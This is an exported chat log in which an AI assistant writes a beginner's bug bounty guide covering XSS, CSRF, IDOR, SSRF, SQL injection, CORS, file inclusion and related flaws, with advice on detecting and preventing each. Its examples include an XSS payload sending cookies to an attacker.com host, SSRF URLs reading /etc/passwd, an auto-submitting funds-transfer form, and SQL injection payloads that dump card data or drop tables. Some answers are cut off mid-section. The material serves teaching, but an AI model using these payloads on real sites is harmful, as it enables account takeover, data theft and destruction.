# Please provide a comprehensive beginner's guide to bug bounties, focusing on the fundamentals of Recon and common vulnerabilities like Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Insecure Direct Object References (IDOR), Server-Side Request Forgery (SSRF), SQL Injection, Cross-Origin Resource Sharing (CORS) vulnerabilities, and Session Hijacking. Explain each vulnerability, and provide examples of how they can be exploited. Explain how to find these bugs while doing an audit on a website (hunting for bugs in a bug bounty program) and suggest best practices for preventing and mitigating these vulnerabilities.
Exported on 26/06/2023 02:45:49 [from Phind.com](https://www.phind.com/search?cache=80409443-ca02-4c85-9134-b3124439f2fb) - with SaveMyPhind


___
**You:**
Please provide a comprehensive beginner's guide to bug bounties, focusing on the fundamentals of Recon and common vulnerabilities like Cross-Site Scri...

___
**Gpt-4 answer:**
Beginner's Guide to Bug Bounties: Recon and Common Vulnerabilities
------------------------------------------------------------------

### Recon

Reconnaissance, or "recon," is the process of gathering information about a target system before attempting to attack it. This can involve using various tools and techniques to identify potential vulnerabilities and entry points.

### Common Vulnerabilities

#### 1\. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. These scripts can steal user data, manipulate web content, or redirect users to malicious websites.

Example of an XSS payload:

```xml
<script>alert('XSS');</script>
```

To find XSS vulnerabilities during an audit, look for input fields, URL parameters, and other areas where user input is accepted and rendered back to the user without proper sanitization. To prevent XSS attacks, always sanitize and validate user input, use secure coding practices, and implement Content Security Policy (CSP) headers. [openbugbounty.org](https://www.openbugbounty.org/blog/tag/cross-site-scripting-xss/)

#### 2\. Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a vulnerability that allows an attacker to force a user to perform actions on a website without their consent. This can lead to unauthorized actions, such as changing the user's email address or password.

Example of a CSRF exploit:

```html
<img src="https://example.com/changeEmail?newEmail=attacker@email.com" width="0" height="0" />
```

To find CSRF vulnerabilities, look for state-changing requests that do not have proper anti-CSRF tokens or other protections in place. To prevent CSRF attacks, use anti-CSRF tokens, validate and sanitize user input, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/csrf)

#### 3\. Insecure Direct Object References (IDOR)

Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to access objects directly, without proper access controls. This can lead to unauthorized access to sensitive data or functionality.

Example of an IDOR vulnerability:

```bash
https://example.com/customerAccount?customer_number=12345
```

To find IDOR vulnerabilities, look for URL parameters, input fields, or other areas where user input is used to access resources directly. To prevent IDOR attacks, implement proper access controls, validate and sanitize user input, and avoid exposing direct references to internal objects. [portswigger.net](https://portswigger.net/web-security/access-control/idor)

#### 4\. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server-side application send requests to arbitrary locations, potentially accessing sensitive data or internal systems.

Example of an SSRF exploit:

```bash
https://example.com/stockAPI?url=https://192.168.0.68/admin
```

To find SSRF vulnerabilities, look for areas where user-supplied URLs or other inputs are used to make server-side requests. To prevent SSRF attacks, validate and sanitize user input, use allowlists for permitted URLs, and implement proper network segmentation. [portswigger.net](https://portswigger.net/web-security/ssrf)

#### 5\. SQL Injection

SQL Injection is a vulnerability that allows an attacker to inject malicious SQL code into a query, potentially manipulating the database and accessing sensitive data.

Example of an SQL Injection payload:

```vbnet
' OR 1=1 --
```

To find SQL Injection vulnerabilities, look for input fields, URL parameters, or other areas where user input is used in SQL queries. To prevent SQL Injection attacks, use parameterized queries or prepared statements, validate and sanitize user input, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/sql-injection)

#### 6\. Cross-Origin Resource Sharing (CORS) Vulnerabilities

CORS vulnerabilities occur when an application allows unauthorized domains to access its resources, potentially leading to data leakage or manipulation.

Example of a CORS vulnerability:

```makefile
Access-Control-Allow-Origin: *
```

To find CORS vulnerabilities, look for misconfigured CORS headers in server responses. To prevent CORS vulnerabilities, configure CORS headers properly, use allowlists for permitted domains, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/cors)

#### 7\. Session Hijacking

Session Hijacking is an attack where an attacker steals a user's session identifier, allowing them to impersonate the user and perform actions on their behalf.

Example of a Session Hijacking exploit:

```vbnet
Stealing a user's session cookie and using it to access their account.
```

To find Session Hijacking vulnerabilities, look for insecure handling of session identifiers, such as transmitting them over insecure channels or storing them in insecure locations. To prevent Session Hijacking, use secure session management practices,

**Sources:**
beginner's guide bug bounties fundamentals Recon common vulnerabilities Cross-Site Scripting XSS Cross-Site Request Forgery CSRF Insecure Direct Object References IDOR Server-Side Request Forgery SSRF SQL Injection Cross-Origin Resource Sharing CORS vulnerabilities Session Hijacking examples exploitation audits website bug bounty program best practices prevention mitigation
- [(0) Top 25 Server-Side Request Forgery (SSRF) Bug Bounty Reports | ...](https://corneacristian.medium.com/top-25-server-side-request-forgery-ssrf-bug-bounty-reports-136928356eca?source=rss------hacking-5)
- [(1) What is SSRF (Server-side request forgery)? Tutorial & Examples ...](https://portswigger.net/web-security/ssrf)
- [(2) Insecure direct object references (IDOR) | Web Security Academy](https://portswigger.net/web-security/access-control/idor)
- [(3) cross site scripting xss – Open Bug Bounty Blog](https://www.openbugbounty.org/blog/tag/cross-site-scripting-xss/)
- [(4) How-To: Find IDOR (Insecure Direct Object Reference) Vulnerabilities ...](https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/)


___
**You:**
Add in information about LFI, RFI, Http parameter pollution, command injection, open redirect, XML external entity, File upload, server side XSS, etc

___
**Gpt-4 answer:**
#### 8\. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

LFI and RFI are vulnerabilities that allow an attacker to include local or remote files in a web application, potentially leading to unauthorized access to sensitive data or execution of malicious code. LFI involves including a file stored on the target server, while RFI involves including a file from an external source [spanning.com](https://spanning.com/blog/file-inclusion-vulnerabilities-lfi-rfi-web-based-application-security-part-9/).

To find LFI and RFI vulnerabilities, look for areas where user input is used to include files, such as URL parameters or input fields, without proper validation. To prevent LFI and RFI attacks, sanitize and validate user input, disable remote inclusion features in PHP configuration, and whitelist accepted filenames [secf00tprint.github.io](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en).

#### 9\. HTTP Parameter Pollution (HPP)

HTTP Parameter Pollution (HPP) is a vulnerability that allows an attacker to manipulate or inject additional HTTP parameters into a request, potentially leading to unauthorized actions or data manipulation.

To find HPP vulnerabilities, look for areas where multiple HTTP parameters with the same name are accepted without proper validation. To prevent HPP attacks, sanitize and validate user input, implement server-side input validation, and use secure coding practices.

#### 10\. Command Injection

Command Injection is a vulnerability that allows an attacker to execute arbitrary system commands on the server by injecting malicious input into a vulnerable application.

To find Command Injection vulnerabilities, look for areas where user input is used to construct and execute system commands without proper validation. To prevent Command Injection attacks, sanitize and validate user input, use parameterized APIs, and implement proper access controls.

#### 11\. Open Redirect

Open Redirect is a vulnerability that allows an attacker to redirect users to arbitrary domains by manipulating a vulnerable application's URL parameters or input fields.

To find Open Redirect vulnerabilities, look for areas where user input is used to construct redirect URLs without proper validation. To prevent Open Redirect attacks, sanitize and validate user input, use allowlists for permitted domains, and implement proper access controls.

#### 12\. XML External Entity (XXE)

XML External Entity (XXE) is a vulnerability that allows an attacker to exploit external entities in XML documents, potentially leading to unauthorized access to sensitive data or remote code execution.

To find XXE vulnerabilities, look for areas where XML documents are parsed without proper validation or security configurations. To prevent XXE attacks, disable external entities in XML parsers, validate and sanitize user input, and use secure coding practices.

#### 13\. File Upload Vulnerabilities

File Upload vulnerabilities occur when an application allows unauthorized or unvalidated file uploads, potentially leading to unauthorized access to sensitive data, remote code execution, or other attacks.

To find File Upload vulnerabilities, look for areas where file uploads are accepted without proper validation, file type restrictions, or access controls. To prevent File Upload vulnerabilities, sanitize and validate user input, implement secure file upload practices, and use proper access controls.

#### 14\. Server-Side XSS

Server-Side XSS is a variant of Cross-Site Scripting (XSS) where the malicious payload is stored and executed on the server-side, rather than being reflected in the client-side application.

To find Server-Side XSS vulnerabilities, look for areas where user input is stored on the server and later rendered back to users without proper sanitization. To prevent Server-Side XSS attacks, sanitize and validate user input, use secure coding practices, and implement Content Security Policy (CSP) headers.

**Sources:**
LFI RFI Http parameter pollution command injection open redirect XML external entity File upload server side XSS vulnerability beginners guide
- [(0) Local File Inclusion: Understanding and Preventing Attacks](https://brightsec.com/blog/local-file-inclusion-lfi/)
- [(1) A Pentester’s Guide to File Inclusion | Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)
- [(2) File Inclusion/Path traversal - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [(3) What is RFI | Remote File Inclusion Example & Mitigation Methods ...](https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/)
- [(4) File Inclusion Vulnerabilities: LFI & RFI | Spanning Backup](https://spanning.com/blog/file-inclusion-vulnerabilities-lfi-rfi-web-based-application-security-part-9/)


___
**You:**
Give 3 to 4 more detailed examples for each of these 14 vulnerabilities and give an in-depth analysis and explanation for each of them

___
**Gpt-4 answer:**
Here, I provide 3 to 4 detailed examples for each of the 14 vulnerabilities mentioned earlier, along with in-depth analysis and explanations for each of them.

#### 1\. Cross-Site Scripting (XSS)

Example 1: Reflected XSS in a search field

```xml
https://example.com/search?q=<script>alert('XSS');</script>
```

In this example, the user input is included in the search results page without proper sanitization, causing the JavaScript code to execute when the page loads.

Example 2: Stored XSS in a comment system

```xml
User submits a comment: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>"
```

The malicious comment is stored in the database and executed whenever a user views the comment, potentially stealing their session cookie.

Example 3: DOM-based XSS in a URL fragment

```xml
https://example.com/page#<img src=x onerror=alert('XSS');>
```

In this example, the URL fragment is used to update the page's content using JavaScript, which doesn't properly sanitize the input, leading to code execution.

#### 2\. Cross-Site Request Forgery (CSRF)

Example 1: Changing a user's email address

```html
<img src="https://example.com/changeEmail?newEmail=attacker@email.com" width="0" height="0" />
```

The attacker creates an image tag with the source URL set to the email change endpoint, causing the victim's browser to send a request to change their email address without their consent.

Example 2: Transferring funds between bank accounts

```html
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="toAccount" value="attacker_account" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

The attacker embeds this form in a malicious website, which submits a fund transfer request when visited by a logged-in bank user.

Example 3: Liking a social media post without user consent

```html
<img src="https://socialmedia.com/likePost?postId=12345" width="0" height="0" />
```

The attacker uses an image tag to send a request to like a specific post on behalf of the victim without their consent.

#### 3\. Insecure Direct Object References (IDOR)

Example 1: Accessing another user's bank account

```bash
https://bank.com/account?accountId=12345
```

An attacker changes the `accountId` parameter to access another user's account data without authorization.

Example 2: Viewing another user's private messages

```bash
https://socialmedia.com/messages?userId=67890
```

The attacker modifies the `userId` parameter to view another user's private messages without proper access controls.

Example 3: Downloading another user's files

```bash
https://filestorage.com/download?fileId=abcdef
```

An attacker changes the `fileId` parameter to download another user's files without authorization.

#### 4\. Server-Side Request Forgery (SSRF)

Example 1: Accessing internal network resources

```bash
https://example.com/proxy?url=http://192.168.0.5/admin
```

The attacker uses the vulnerable proxy functionality to access an internal admin panel that should not be exposed to the public.

Example 2: Bypassing IP-based access controls

```bash
https://example.com/api?callbackUrl=http://attacker.com/evil-script
```

The attacker tricks the server into making a request to a malicious URL, bypassing IP-based access controls.

Example 3: Triggering a remote code execution on the server

```perl
https://example.com/image?url=file:///etc/passwd
```

The attacker uses the server's image processing functionality to access sensitive files on the server, potentially leading to remote code execution.

#### 5\. SQL Injection

Example 1: Bypassing authentication

```vbnet
Username: ' OR 1=1 --
Password: (empty)
```

The attacker injects an SQL payload into the username field, causing the authentication query to return true and bypass the password check.

Example 2: Accessing sensitive data

```bash
https://example.com/user?id=1' UNION SELECT credit_card_number, expiration_date, cvv FROM credit_cards WHERE user_id = 1--
```

The attacker injects an SQL payload into the URL parameter to access sensitive credit card data from the database.

Example 3: Deleting data from the database

```sql
https://example.com/delete?itemId=1; DROP TABLE users--
```

The attacker injects an SQL payload into the URL parameter to delete an entire table from the database.

#### 6\. Cross-Origin Resource Sharing (CORS) Vulnerabilities

**Sources:**
detailed examples analysis explanation LFI RFI HPP Command Injection Open Redirect XXE File Upload Server-Side XSS XSS CSRF IDOR SSRF SQL Injection CORS vulnerabilities Session Hijacking
- [(0) Web Vulnerabilities](https://securityguill.com/webvuln.html)
- [(1) What is SSRF (Server-side request forgery)? Tutorial & Examples ...](https://portswigger.net/web-security/ssrf)
- [(2) What is RFI | Remote File Inclusion Example & Mitigation Methods ...](https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/)
- [(3) File Inclusion/Path traversal - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [(4) Local File Inclusion: Understanding and Preventing Attacks](https://brightsec.com/blog/local-file-inclusion-lfi/)

